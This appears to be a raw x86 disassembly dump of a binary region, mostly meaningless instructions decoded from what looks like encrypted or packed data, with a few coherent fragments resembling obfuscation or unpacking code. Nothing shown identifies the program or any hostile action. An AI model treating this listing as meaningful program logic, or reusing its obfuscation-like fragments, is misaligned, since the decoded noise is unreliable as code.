  40c0a4:	loopne 0x40c0c1
  40c0a6:	repz pop ds
  40c0a8:	(bad)  
  40c0a9:	std    
  40c0aa:	xor    ebx,DWORD PTR [ebp+ebx*1-0x41]
  40c0ae:	and    edi,0x7daf678c
  40c0b4:	add    BYTE PTR [eax],al
  40c0b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0b7:	add    BYTE PTR [eax],al
  40c0b9:	add    dl,ch
  40c0bb:	push   edi
  40c0bc:	les    esi,FWORD PTR [ebp+0x33a4adfd]
  40c0c2:	(bad)  
  40c0c3:	xchg   ecx,eax
  40c0c4:	shl    DWORD PTR [edx-0x39],cl
  40c0c7:	imul   ecx,DWORD PTR [ebx],0xd053b7f
  40c0cd:	popf   
  40c0ce:	and    al,0x97
  40c0d0:	test   al,0x16
  40c0d2:	inc    edx
  40c0d3:	(bad)  
  40c0d4:	cs out 0x57,eax
  40c0d7:	cmp    edi,esi
  40c0d9:	js     0x40c157
  40c0db:	and    eax,0xa018bb0c
  40c0e0:	jmp    0x3923:0xe3a2e25d
  40c0e7:	out    dx,eax
  40c0e8:	xor    BYTE PTR [ecx-0x5f],dh
  40c0eb:	or     BYTE PTR [ebx+0x4fe4c6d0],bl
  40c0f1:	xchg   edi,eax
  40c0f2:	out    0x55,al
  40c0f4:	mov    ah,0x72
  40c0f6:	mov    bh,0x40
  40c0f8:	xchg   cl,al
  40c0fa:	pop    ss
  40c0fb:	fwait
  40c0fc:	test   eax,0xdd47a88e
  40c101:	and    al,0x82
  40c103:	inc    edi
  40c104:	xor    al,0x77
  40c107:	fwait
  40c108:	jmp    0x390b:0x668e4633
  40c10f:	dec    esp
  40c110:	or     bh,cl
  40c112:	push   0x51
  40c114:	(bad)  
  40c115:	push   0x79
  40c117:	sbb    edx,DWORD PTR [ebx+ecx*8-0xb]
  40c11b:	les    eax,FWORD PTR [ebp-0x2378dcde]
  40c121:	sub    BYTE PTR [esi],bl
  40c123:	or     edi,DWORD PTR [esi-0x6]
  40c126:	jb     0x40c0e6
  40c128:	js     0x40c18e
  40c12a:	and    cl,BYTE PTR [ebp+eax*8-0x54]
  40c12e:	retf   0xf94b
  40c131:	mov    eax,0x2ad5ffc3
  40c136:	inc    edx
  40c137:	test   DWORD PTR [eax-0x59cee622],edx
  40c13d:	mov    ah,cl
  40c13f:	addr16 mov bh,0xcd
  40c142:	stc    
  40c143:	xbegin 0x1c6f81ba
  40c149:	inc    eax
  40c14a:	(bad)  
  40c14b:	mov    al,0x78
  40c14d:	or     al,0xb9
  40c14f:	sti    
  40c150:	aaa    
  40c151:	(bad)  
  40c152:	jl     0x40c1b8
  40c154:	imul   ecx,esp,0x248d38e0
  40c15a:	arpl   WORD PTR [ecx-0x74a456e7],ax
  40c160:	shr    DWORD PTR [ebx],1
  40c162:	ror    BYTE PTR [ebx+0x758be445],1
  40c168:	call   0x417f56
  40c16d:	add    dl,bh
  40c16f:	imul   eax,DWORD PTR [ecx+0x1c],0xffffffd1
  40c173:	ds (bad) 
  40c175:	out    dx,eax
  40c176:	cli    
  40c177:	push   0xef823307
  40c17c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c17d:	mov    eax,ds:0x7e54
  40c182:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c183:	add    BYTE PTR [eax],al
  40c185:	add    BYTE PTR [ebx+0x6b],al
  40c188:	lods   al,BYTE PTR ds:[esi]
  40c189:	cmp    al,BYTE PTR [esi]
  40c18b:	inc    edx
  40c18c:	or     DWORD PTR [ebx-0x7ce6d7c1],ecx
  40c192:	mov    ds:0xaf6182f5,al
  40c197:	hlt    
  40c198:	inc    ebp
  40c199:	xchg   BYTE PTR [edi-0x2f],ah
  40c19c:	mov    esi,DWORD PTR [edx]
  40c19e:	or     bl,BYTE PTR [ebx]
  40c1a0:	loopne 0x40c1fa
  40c1a2:	mov    bh,0x1e
  40c1a4:	leave  
  40c1a5:	arpl   WORD PTR [ebx+0x7b0f3e2c],si
  40c1ab:	stc    
  40c1ac:	push   ecx
  40c1ad:	dec    ebp
  40c1ae:	or     bl,bh
  40c1b0:	(bad)  
  40c1b1:	(bad)  [edx-0x82f8e06]
  40c1b7:	adc    eax,0xeff1d9a2
  40c1bc:	lods   eax,DWORD PTR fs:[si]
  40c1bf:	sbb    BYTE PTR [esi-0x2],0x67
  40c1c3:	call   0x92b6:0xf0c3da23
  40c1ca:	fptan  
  40c1cc:	push   0x20
  40c1ce:	call   0x4004:0xf8eecbeb
  40c1d5:	std    
  40c1d6:	inc    ecx
  40c1d7:	sbb    dh,dl
  40c1d9:	aam    0x47
  40c1db:	add    DWORD PTR [edx-0x7c2b2093],edx
  40c1e1:	hlt    
  40c1e2:	sti    
  40c1e3:	fwait
  40c1e4:	xchg   BYTE PTR [edx-0x16],bh
  40c1e7:	les    ecx,FWORD PTR [ebx-0x27e0dd40]
  40c1ed:	call   0x5673aa33
  40c1f2:	jl     0x40c228
  40c1f4:	shr    BYTE PTR [ebp-0x28],0x1a
  40c1f8:	jnp    0x40c1f1
  40c1fa:	add    al,0x6d
  40c1fc:	xchg   edi,eax
  40c1fd:	aas    
  40c1fe:	sub    DWORD PTR [ebx-0x47],0xffffffec
  40c202:	shl    BYTE PTR [ebp-0x49],1
  40c205:	cmp    cl,BYTE PTR ss:[eax-0x38]
  40c209:	cwde   
  40c20a:	mov    dl,0x90
  40c20c:	add    DWORD PTR [eax],esi
  40c20e:	cs lahf 
  40c210:	mov    ch,0xdf
  40c212:	pop    esp
  40c213:	loop   0x40c1ae
  40c215:	xchg   ebx,eax
  40c216:	and    BYTE PTR [eax+0x5a],dl
  40c219:	mov    edi,0x984188e1
  40c21e:	sub    dl,BYTE PTR [edx+0x50]
  40c221:	test   BYTE PTR [edx],dl
  40c223:	add    ebp,esi
  40c225:	cvttps2pi mm4,QWORD PTR [ecx+0x6940fa5a]
  40c22c:	shr    bh,0x76
  40c22f:	add    BYTE PTR [eax],al
  40c231:	and    eax,esi
  40c233:	mov    esi,DWORD PTR [ebp-0x14]
  40c236:	sub    eax,esi
  40c238:	mov    esi,DWORD PTR [ebp-0x10]
  40c23b:	or     eax,esi
  40c23d:	mov    esi,DWORD PTR ds:0x42f1b4
  40c243:	jmp    0x40c305
  40c248:	inc    edi
  40c249:	push   ss
  40c24a:	rcl    al,1
  40c24c:	rcl    esi,1
  40c24e:	inc    edi
  40c24f:	xchg   edi,eax
  40c250:	pop    edi
  40c251:	ds (bad) 
  40c253:	in     al,0xc6
  40c255:	jmp    0x7f3a1146
  40c25a:	add    BYTE PTR [eax],al
  40c25c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c25d:	add    BYTE PTR [eax],al
  40c25f:	add    BYTE PTR [eax],al
  40c261:	cmc    
  40c262:	icebp  
  40c263:	xchg   edi,edx
  40c265:	arpl   WORD PTR [eax+0x21],si
  40c268:	dec    esi
  40c269:	or     al,0x45
  40c26b:	and    al,0x39
  40c26d:	sbb    dl,bh
  40c26f:	imul   edx,edx,0xffffffa0
  40c272:	xor    DWORD PTR [esi],0xcaede8d6
  40c278:	jo     0x40c22d
  40c27a:	retf   
  40c27b:	sbb    BYTE PTR [ecx],bh
  40c27d:	inc    eax
  40c27e:	int    0xe0
  40c280:	jl     0x40c26a
  40c282:	loop   0x40c295
  40c284:	sub    al,0x45
  40c286:	ficom  DWORD PTR [eax-0x2e4ab4be]
  40c28c:	jno    0x40c2a6
  40c28e:	jp     0x40c281
  40c290:	sete   ch
  40c293:	imul   edi,esp,0x1c
  40c296:	lea    esi,[ecx]
  40c298:	xchg   ebx,eax
  40c299:	addr16 int3 
  40c29b:	jle    0x40c288
  40c29d:	les    edi,FWORD PTR [esi]
  40c29f:	pop    ebp
  40c2a0:	hlt    
  40c2a1:	adc    BYTE PTR [eax],bl
  40c2a3:	jecxz  0x40c2b5
  40c2a5:	arpl   dx,dx
  40c2a7:	xor    cl,BYTE PTR [edx]
  40c2a9:	test   BYTE PTR [esi+0x43bdcee0],0xf
  40c2b0:	in     al,dx
  40c2b1:	scas   eax,DWORD PTR es:[edi]
  40c2b2:	inc    eax
  40c2b3:	push   si
  40c2b5:	mov    esp,ebx
  40c2b7:	lods   al,BYTE PTR ds:[esi]
  40c2b8:	xchg   edx,eax
  40c2b9:	hlt    
  40c2ba:	jmp    0x8e28:0xa12231ab
  40c2c1:	popa   
  40c2c2:	mov    al,ds:0x92a3b060
  40c2c7:	idiv   BYTE PTR [edx-0x2d]
  40c2ca:	pop    edx
  40c2cb:	scas   eax,DWORD PTR es:[edi]
  40c2cc:	pop    ebp
  40c2cd:	xchg   ecx,eax
  40c2ce:	das    
  40c2cf:	push   eax
  40c2d0:	sub    bl,0x9c
  40c2d3:	xor    ebp,DWORD PTR [edi+0x27dcf6a6]
  40c2d9:	sbb    al,0xba
  40c2db:	mov    al,0x12
  40c2dd:	popf   
  40c2de:	int    0x74
  40c2e0:	mov    ds:0x574bfc7e,eax
  40c2e5:	jae    0x40c366
  40c2e7:	inc    ebx
  40c2e8:	mov    dh,bh
  40c2ea:	pop    ds
  40c2eb:	dec    edx
  40c2ec:	sub    DWORD PTR [eax+ebx*4-0x59],edx
  40c2f0:	push   ecx
  40c2f1:	ins    DWORD PTR es:[edi],dx
  40c2f2:	test   DWORD PTR [ecx+eiz*2+0x72055d45],0xb844167d
  40c2fd:	scas   al,BYTE PTR es:[edi]
  40c2fe:	fnstcw WORD PTR [ebp-0x357f1720]
  40c304:	mov    ah,0x8b
  40c306:	mov    dh,0xc0
  40c308:	add    DWORD PTR [eax],eax
  40c30a:	add    cl,ch
  40c30c:	mov    ebp,0x4d000000
  40c311:	nop
  40c312:	cmc    
  40c313:	inc    ecx
  40c314:	std    
  40c315:	gs std 
  40c317:	pushf  
  40c318:	in     eax,dx
  40c319:	in     eax,dx
  40c31a:	fld    TBYTE PTR [ecx-0x4a]
  40c31d:	in     al,dx
  40c31e:	xchg   DWORD PTR [eax-0x62],esi
  40c321:	jg     0x40c323
  40c323:	add    BYTE PTR [ebp+0x6b000000],ah
  40c329:	push   es
  40c32a:	das    
  40c32b:	cli    
  40c32c:	and    ebp,esp
  40c32e:	mov    edi,0x62827a98
  40c333:	loopne 0x40c34f
  40c335:	fcomp  QWORD PTR [esi+0x13]
  40c338:	iret   
  40c339:	cmp    al,0x25
  40c33b:	sub    DWORD PTR [edi],esi
  40c33d:	inc    edx
  40c33e:	sbb    al,0xea
  40c340:	mov    dl,0xbd
  40c342:	outs   dx,DWORD PTR ds:[esi]
  40c343:	sbb    BYTE PTR [eax],ah
  40c345:	out    dx,al
  40c346:	loop   0x40c35d
  40c348:	push   esp
  40c349:	dec    eax
  40c34a:	sbb    eax,0xfa7c5c60
  40c34f:	dec    ecx
  40c350:	xor    dl,BYTE PTR [eax+0x36]
  40c353:	mov    eax,DWORD PTR [ebp+ebx*4-0x2ffe2fab]
  40c35a:	pop    esi
  40c35b:	inc    ebp
  40c35c:	sbb    al,0x41
  40c35e:	enter  0x757c,0x66
  40c362:	imul   edi,DWORD PTR [edx-0x134993b4],0xffffffa2
  40c369:	bound  esp,QWORD PTR [edi]
  40c36b:	in     eax,0xaf
  40c36d:	idiv   DWORD PTR gs:[esi+ebx*4-0x6ab92476]
  40c375:	aas    
  40c376:	dec    ecx
  40c377:	in     al,dx
  40c378:	out    dx,eax
  40c379:	dec    ecx
  40c37a:	clc    
  40c37b:	loope  0x40c3ac
  40c37d:	popf   
  40c37e:	adc    DWORD PTR [edx+0x6a9a6183],0xffffffab
  40c385:	mov    eax,0xb47ddbf2
  40c38a:	hlt    
  40c38b:	test   DWORD PTR [edx-0x2b381a59],esi
  40c391:	pushf  
  40c392:	mov    ds:0xd2eb33bd,al
  40c397:	sbb    ch,al
  40c399:	pop    ebx
  40c39a:	pop    ds
  40c39b:	sub    bh,al
  40c39d:	xor    ah,ch
  40c39f:	sub    DWORD PTR [esi+0x59210275],edi
  40c3a5:	je     0x40c394
  40c3a7:	sbb    DWORD PTR [edi-0x50],0x3f
  40c3ab:	inc    ebp
  40c3ac:	push   0x65
  40c3ae:	mov    dh,0xb5
  40c3b0:	jge    0x40c3c2
  40c3b2:	push   cs
  40c3b3:	pop    ebp
  40c3b4:	or     BYTE PTR [ebp-0x75003393],ah
  40c3ba:	mov    eax,0xcdab40ab
  40c3bf:	mov    edi,0x2dcb61cf
  40c3c4:	add    ebx,edi
  40c3c6:	int    0x2
  40c3c8:	pop    edi
  40c3c9:	(bad)  
  40c3ca:	test   al,0xd1
  40c3cc:	cdq    
  40c3cd:	sub    esi,eax
  40c3cf:	jmp    0x40c491
  40c3d4:	ins    BYTE PTR es:[edi],dx
  40c3d5:	jne    0x40c3b7
  40c3d7:	int    0xf9
  40c3d9:	(bad)  [ebp-0xb]
  40c3dc:	sub    BYTE PTR [eax-0x4642a0fc],ah
  40c3e2:	repz xchg ebp,eax
  40c3e4:	inc    ebx
  40c3e5:	add    BYTE PTR [eax],0x0
  40c3e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3e9:	add    BYTE PTR [eax],al
  40c3eb:	add    BYTE PTR [esi-0x29],ah
  40c3ee:	das    
  40c3ef:	mov    edi,?
  40c3f1:	ds jmp 0xb9c5:0xd29bb59e
  40c3f9:	imul   eax,DWORD PTR [eax+edx*8],0xf1624846
  40c400:	sbb    ebp,DWORD PTR [edi+0x23]
  40c403:	mov    esi,0xdf8d3156
  40c408:	icebp  
  40c409:	scas   al,BYTE PTR es:[edi]
  40c40a:	cld    
  40c40b:	xchg   ebp,eax
  40c40c:	fwait
  40c40d:	pop    ecx
  40c40e:	es pop edx
  40c410:	test   eax,0x3d76f82c
  40c415:	sub    al,0x4
  40c417:	or     ch,ah
  40c419:	or     DWORD PTR [edx+0x381c79fc],ecx
  40c41f:	mov    edi,0x5989a4ac
  40c424:	xchg   DWORD PTR [edx+0x4b23c941],esi
  40c42a:	pop    edx
  40c42b:	(bad)  
  40c42c:	leave  
  40c42d:	inc    esp
  40c42e:	inc    eax
  40c42f:	push   ds
  40c430:	adc    eax,0x2ffd9d29
  40c435:	pop    esp
  40c436:	loope  0x40c3c8
  40c438:	jg     0x40c40c
  40c43a:	dec    ecx
  40c43b:	push   es
  40c43c:	jmp    0x6659b09d
  40c441:	jnp    0x40c47a
  40c443:	add    eax,0x75139127
  40c448:	dec    eax
  40c449:	push   es
  40c44a:	push   ds
  40c44b:	daa    
  40c44c:	jb     0x40c412
  40c44e:	or     eax,0xb902df23
  40c453:	test   BYTE PTR [esi+0x252609e5],bl
  40c459:	mov    edx,0xdb6d56e9
  40c45e:	mov    edx,0x7ebaef07
  40c463:	lea    eax,[edx]
  40c465:	aam    0xe2
  40c467:	adc    ch,BYTE PTR [ecx+0x5f]
  40c46a:	push   ebp
  40c46b:	shl    BYTE PTR [ecx],0x72
  40c46e:	aaa    
  40c46f:	test   eax,0x2031f14b
  40c474:	out    0xea,al
  40c476:	pop    ebp
  40c477:	js     0x40c42f
  40c479:	inc    esi
  40c47a:	(bad)  
  40c47b:	jl     0x40c4b2
  40c47d:	add    al,0x41
  40c47f:	cdq    
  40c480:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c481:	cs mov eax,0xbb1982ba
  40c487:	sahf   
  40c488:	in     eax,dx
  40c489:	in     al,dx
  40c48a:	mov    ch,ch
  40c48c:	imul   esi,DWORD PTR ds:0x8bd8f40d,0xbde90c45
  40c496:	add    BYTE PTR [eax],al
  40c498:	add    BYTE PTR [eax],ah
  40c49a:	aam    0x7b
  40c49c:	xchg   ebp,eax
  40c49d:	(bad)  
  40c49e:	mov    edi,0x6143f5ee
  40c4a3:	cli    
  40c4a4:	pop    edi
  40c4a5:	push   0xe8a194d8
  40c4aa:	add    BYTE PTR [eax],0x0
  40c4ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4ae:	add    BYTE PTR [eax],al
  40c4b0:	add    ah,bh
  40c4b2:	jp     0x40c441
  40c4b4:	nop
  40c4b5:	fstp   QWORD PTR [esi]
  40c4b7:	push   cs
  40c4b8:	lds    esi,FWORD PTR [eax+ecx*8]
  40c4bb:	rcl    BYTE PTR [esi+0x58c112a9],0xbf
  40c4c2:	adc    al,0x4e
  40c4c4:	sbb    al,0xcc
  40c4c6:	dec    eax
  40c4c7:	add    al,0x86
  40c4c9:	xchg   ebx,eax
  40c4ca:	pusha  
  40c4cb:	in     eax,dx
  40c4cc:	sbb    al,0x1b
  40c4ce:	fstp   QWORD PTR [ebx+0x77]
  40c4d1:	shr    BYTE PTR [ecx+0x7e15db68],0x3e
  40c4d8:	movntq (bad),mm6
  40c4d9:	out    0xf3,eax
  40c4db:	test   al,0x13
  40c4dd:	out    0x41,eax
  40c4df:	adc    esi,esp
  40c4e1:	fiadd  WORD PTR [eax+0x43]
  40c4e4:	popf   
  40c4e5:	test   DWORD PTR [ecx-0x553c6743],edi
  40c4eb:	xor    BYTE PTR [ebp+0x34135c41],bh
  40c4f1:	pop    esi
  40c4f2:	xor    eax,0x96f01eb0
  40c4f7:	push   es
  40c4f8:	in     eax,0x91
  40c4fa:	cmp    eax,0xc6082344
  40c4ff:	pop    ds
  40c500:	fninit 
  40c502:	aam    0x44
  40c504:	or     ecx,DWORD PTR [ebx+0x3d7ea322]
  40c50a:	pop    edx
  40c50b:	push   ebx
  40c50c:	sub    al,0x2b
  40c50e:	ss inc edi
  40c510:	and    ah,BYTE PTR [edi+ebx*4-0x9]
  40c514:	imul   al
  40c516:	mov    bh,0x7c
  40c518:	shl    DWORD PTR [esi-0x45899050],cl
  40c51e:	not    DWORD PTR [eax-0x178d4b53]
  40c524:	xchg   DWORD PTR [esi],ecx
  40c526:	scas   al,BYTE PTR es:[edi]
  40c527:	dec    edi
  40c528:	rcl    DWORD PTR [edx-0x77803725],1
  40c52e:	sub    DWORD PTR [ecx+esi*1],ecx
  40c531:	and    eax,0x409d623a
  40c536:	(bad)  
  40c537:	arpl   ax,sp
  40c539:	cmp    BYTE PTR [esi-0x69],0xeb
  40c53d:	imul   esp,DWORD PTR [ebx],0xf74c2439
  40c543:	sbb    BYTE PTR [eax+ebx*8-0x5881ad27],al
  40c54a:	in     al,dx
  40c54b:	sbb    eax,0xfe203762
  40c550:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c551:	add    eax,0xa0bc518a
  40c556:	mov    al,BYTE PTR [edx+eax*1+0x1d88]
  40c55d:	mov    BYTE PTR [esi+ecx*1+0x513d],al
  40c564:	mov    eax,DWORD PTR [ebp-0xc]
  40c567:	mov    edx,DWORD PTR [ebp-0x8]
  40c56a:	xor    eax,0x3304
  40c56f:	add    eax,0x2f28
  40c574:	imul   eax,eax,0x4904
  40c57a:	jmp    0x40c63c
  40c57f:	mov    es,WORD PTR [edi]
  40c581:	sbb    al,0x43
  40c583:	popf   
  40c584:	pop    ebx
  40c585:	(bad)  
  40c587:	jge    0x40c5a4
  40c589:	stos   BYTE PTR es:[edi],al
  40c58a:	xchg   ebp,eax
  40c58b:	es cmc 
  40c58d:	and    al,0x65
  40c58f:	lea    eax,[ecx+0xa50000]
  40c595:	add    BYTE PTR [eax],al
  40c597:	mov    eax,0xaf90310b
  40c59d:	pop    eax
  40c59e:	loope  0x40c520
  40c5a0:	push   ss
  40c5a1:	in     al,dx
  40c5a2:	jne    0x40c591
  40c5a4:	jb     0x40c61b
  40c5a6:	dec    esp
  40c5a7:	mov    edx,DWORD PTR [esi]
  40c5a9:	rol    dh,cl
  40c5ab:	adc    dh,BYTE PTR [ebx+eax*1-0x21]
  40c5af:	sub    ah,BYTE PTR [esi-0x548a7be3]
  40c5b5:	cwde   
  40c5b6:	pusha  
  40c5b7:	jge    0x40c62c
  40c5b9:	inc    ecx
  40c5ba:	mov    eax,ds:0x6103e231
  40c5bf:	pop    ss
  40c5c0:	stc    
  40c5c1:	adc    DWORD PTR [ebx+edx*4-0xe],0x3885c06f
  40c5c9:	dec    edi
  40c5ca:	fwait
  40c5cb:	cwde   
  40c5cc:	ja     0x40c5e6
  40c5ce:	mov    eax,0xa29a4fbf
  40c5d3:	jae    0x40c584
  40c5d5:	je     0x40c5f0
  40c5d7:	mov    cl,0xc2
  40c5d9:	mov    al,BYTE PTR [eax-0x202e217a]
  40c5df:	mov    dh,0x25
  40c5e1:	jp     0x40c5e3
  40c5e3:	in     al,0x23
  40c5e5:	sbb    ch,BYTE PTR [ebx-0x26]
  40c5e8:	jbe    0x40c63c
  40c5ea:	sti    
  40c5eb:	imul   eax,esp,0xee3a36b4
  40c5f1:	sub    BYTE PTR [ebx],bl
  40c5f3:	mov    esi,0x9a868007
  40c5f8:	rcl    esi,1
  40c5fa:	and    ebx,DWORD PTR [edx-0x54]
  40c5fd:	mov    al,ds:0x76ad91ad
  40c602:	stos   BYTE PTR es:[edi],al
  40c603:	push   edx
  40c604:	nop    ebx
  40c607:	add    dh,BYTE PTR [esi+0x47140e65]
  40c60d:	inc    edx
  40c60e:	xchg   ecx,eax
  40c60f:	fild   DWORD PTR [ebx+0x52]
  40c612:	adc    DWORD PTR [esi],eax
  40c614:	leave  
  40c615:	sti    
  40c616:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c617:	xor    DWORD PTR [ecx+0x229cd63],edi
  40c61d:	and    DWORD PTR [ebx],edi
  40c61f:	or     DWORD PTR [eax-0x2c],esp
  40c622:	push   0x4c
  40c624:	and    dh,BYTE PTR [esi-0x58]
  40c627:	mov    ch,0x6f
  40c629:	imul   ecx,DWORD PTR [ebp-0x19d4cb9c],0xeab7b6b6
  40c633:	or     eax,0x3fa9fccc
  40c638:	add    dh,BYTE PTR [edx-0x3ddc3236]
  40c63e:	lea    ecx,[ecx+eax*1-0xbf]
  40c645:	mov    eax,DWORD PTR [ebp-0x4]
  40c648:	mov    edx,DWORD PTR [ebp-0x28]
  40c64b:	or     eax,edx
  40c64d:	mov    edx,DWORD PTR [ebp-0x2c]
  40c650:	and    eax,edx
  40c652:	mov    edx,DWORD PTR [ebp-0x30]
  40c655:	jmp    0x40c717
  40c65a:	jge    0x40c611
  40c65c:	js     0x40c6c5
  40c65e:	clc    
  40c65f:	out    dx,eax
  40c660:	jg     0x40c621
  40c662:	adc    esp,ebx
  40c664:	imul   eax,ebx,0xa100b079
  40c66a:	xor    al,BYTE PTR [edx+0xa50000]
  40c670:	add    BYTE PTR [eax],al
  40c672:	imul   cl
  40c674:	fild   DWORD PTR [esi+0x3ecb3161]
  40c67a:	into   
  40c67b:	and    ch,BYTE PTR [ebp-0x79]
  40c67e:	dec    ebp
  40c67f:	fist   DWORD PTR [ecx-0x653a4016]
  40c685:	push   ecx
  40c686:	test   ah,0x5a
  40c689:	imul   ebx,DWORD PTR [ebx],0x75ebccd4
  40c68f:	mov    ds:0x538cc6f6,al
  40c694:	shl    BYTE PTR [ebx+0x29],0x1b
  40c698:	inc    esp
  40c699:	jnp    0x40c6e5
  40c69b:	loopne 0x40c625
  40c69d:	cmp    BYTE PTR [edi-0x20],0x63
  40c6a1:	fiadd  DWORD PTR [edx]
  40c6a3:	lods   eax,DWORD PTR ds:[esi]
  40c6a4:	push   ss
  40c6a5:	mov    ch,0x6f
  40c6a7:	dec    esp
  40c6a8:	sbb    eax,0x5ff0c7a0
  40c6ad:	jne    0x40c69f
  40c6af:	cmc    
  40c6b0:	imul   esi,DWORD PTR [ecx-0x76e19bf4],0xfffffff4
  40c6b7:	push   0x2ee2f3af
  40c6bc:	mov    ?,WORD PTR [ecx-0x11]
  40c6bf:	cmp    eax,0xaf8cf98e
  40c6c4:	fsubr  QWORD PTR [ebp+0x1e4dff0f]
  40c6ca:	je     0x40c689
  40c6cc:	loopne 0x40c6a2
  40c6ce:	mov    dh,BYTE PTR [edx-0x48]
  40c6d1:	fs dec ebp
  40c6d3:	lahf   
  40c6d4:	inc    esi
  40c6d5:	sub    BYTE PTR [eax-0x5a99facd],0x2a
  40c6dc:	out    dx,eax
  40c6dd:	pop    edx
  40c6de:	jbe    0x40c715
  40c6e0:	inc    esi
  40c6e1:	mov    bl,0xa6
  40c6e3:	cwde   
  40c6e4:	dec    ecx
  40c6e5:	add    esp,esp
  40c6e7:	jp     0x40c6e7
  40c6e9:	inc    ecx
  40c6ea:	add    DWORD PTR [ebx+0x65b9fb51],ebp
  40c6f0:	popf   
  40c6f1:	cdq    
  40c6f2:	dec    esp
  40c6f3:	in     al,0xf8
  40c6f5:	repnz sub BYTE PTR [ecx],0xd7
  40c6f9:	into   
  40c6fa:	xor    eax,0x5c69b5d5
  40c6ff:	inc    eax
  40c700:	inc    ecx
  40c701:	pop    ebp
  40c702:	out    0x80,al
  40c704:	pop    eax
  40c705:	dec    edx
  40c706:	cmp    DWORD PTR [ecx+0x7af382a8],ebp
  40c70c:	mov    al,0x9f
  40c70e:	mov    ebx,0xfcc68a88
  40c713:	ret    
  40c714:	jo     0x40c6a4
  40c716:	cmp    eax,0xdcc758b
  40c71b:	and    al,0x68
  40c71d:	add    BYTE PTR [eax],al
  40c71f:	xor    eax,edx
  40c721:	xor    edx,edx
  40c723:	jmp    0x40c7e5
  40c728:	adc    DWORD PTR [ebp+ebp*4-0x19],ebx
  40c72c:	in     eax,dx
  40c72d:	neg    DWORD PTR [ebx-0x2]
  40c730:	cmp    edi,eax
  40c732:	push   ebp
  40c733:	lahf   
  40c734:	mov    BYTE PTR [eax+ebp*2],bl
  40c737:	(bad)  
  40c738:	xlat   BYTE PTR ds:[ebx]
  40c739:	add    BYTE PTR [eax],0x0
  40c73c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c73d:	add    BYTE PTR [eax],al
  40c73f:	add    BYTE PTR [edi-0x707d4af],dh
  40c745:	pop    esp
  40c746:	mov    al,BYTE PTR [ecx+0x473ee9de]
  40c74c:	dec    esi
  40c74d:	mov    dh,0xdf
  40c74f:	inc    edi
  40c750:	into   
  40c751:	stos   BYTE PTR es:[edi],al
  40c752:	xor    cl,BYTE PTR [ecx]
  40c754:	pop    ebp
  40c755:	xchg   BYTE PTR [eax+ecx*4],ah
  40c758:	sbb    BYTE PTR [ebp+0x309b1854],cl
  40c75e:	xor    bl,BYTE PTR [esi+0xd]
  40c761:	sub    DWORD PTR [eax+esi*1-0x4b],esp
  40c765:	sbb    bh,BYTE PTR [edx-0x64992ba3]
  40c76b:	push   0xfffaea7f
  40c770:	rcl    DWORD PTR ds:0xe563c0f0,1
  40c776:	or     dl,BYTE PTR [eax-0x572b5696]
  40c77c:	push   esp
  40c77d:	out    0x59,eax
  40c77f:	sub    BYTE PTR [edx-0x168c6935],cl
  40c785:	mov    ebx,0xd778dd7
  40c78a:	lods   al,BYTE PTR ds:[esi]
  40c78b:	sbb    BYTE PTR [ebx+0x6e63dc5b],bl
  40c791:	and    al,0x51
  40c793:	out    0x4a,eax
  40c795:	mov    esp,0xf2ab6191
  40c79a:	xlat   BYTE PTR ds:[ebx]
  40c79b:	add    eax,0xcee84b63
  40c7a0:	retf   0x2e0d
  40c7a3:	popa   
  40c7a4:	sbb    eax,0xfbf8427d
  40c7a9:	cmp    bl,bl
  40c7ab:	mov    dh,0xc0
  40c7ad:	fs xchg esp,eax
  40c7af:	in     al,dx
  40c7b0:	add    ah,BYTE PTR [ebx+ebp*8]
  40c7b3:	fxam   
  40c7b5:	shr    BYTE PTR [eax+edi*4-0x62],0xd3
  40c7ba:	les    edi,FWORD PTR [esp+ebx*2+0x6af60ffe]
  40c7c1:	cmc    
  40c7c2:	push   ss
  40c7c3:	cmp    eax,0x1da8121
  40c7c8:	push   ebx
  40c7c9:	scas   eax,DWORD PTR es:[edi]
  40c7ca:	test   DWORD PTR [edi-0x74],0x85e7856d
  40c7d1:	daa    
  40c7d2:	ja     0x40c81c
  40c7d4:	add    eax,0x30cf14b8
  40c7d9:	xor    DWORD PTR [esi+0x68b852cc],0xa54109f9
  40c7e3:	xchg   BYTE PTR [ecx+0x5f05f6f7],dl
  40c7e9:	sub    BYTE PTR [eax],al
  40c7eb:	add    cl,ch
  40c7ed:	mov    ebp,0xad000000
  40c7f2:	test   al,0x24
  40c7f4:	mov    al,ds:0xadadac25
  40c7f9:	gs jmp 0x40c7d1
  40c7fc:	xchg   ebp,eax
  40c7fd:	push   esi
  40c7fe:	dec    esi
  40c7ff:	xchg   BYTE PTR [edi+0x837c],cl
  40c805:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c806:	add    BYTE PTR [eax],al
  40c808:	add    BYTE PTR [edx-0x45],ch
  40c80b:	adc    edi,esp
  40c80d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c80e:	or     eax,0x50f0bcbc
  40c813:	ss pop ss
  40c815:	out    0xea,eax
  40c817:	push   ebp
  40c818:	xlat   BYTE PTR ss:[ebx]
  40c81a:	adc    bl,al
  40c81c:	icebp  
  40c81d:	xchg   edi,eax
  40c81e:	sbb    eax,0xab5930d3
  40c823:	sub    esp,DWORD PTR [esi]
  40c825:	xlat   BYTE PTR ds:[ebx]
  40c826:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c827:	push   ebx
  40c828:	nop
  40c829:	mov    esp,?
  40c82b:	fnsave [edx+ebx*1]
  40c82e:	bound  edx,QWORD PTR [eax]
  40c830:	inc    ebp
  40c831:	xchg   ecx,eax
  40c832:	xor    al,dl
  40c834:	push   esp
  40c835:	imul   edi,DWORD PTR [ebp+ecx*1+0x12],0x77d083f7
  40c83d:	gs leave 
  40c83f:	jmp    0x40c899
  40c841:	sbb    ecx,esi
  40c843:	or     al,0x86
  40c845:	icebp  
  40c846:	ins    DWORD PTR es:[edi],dx
  40c847:	leave  
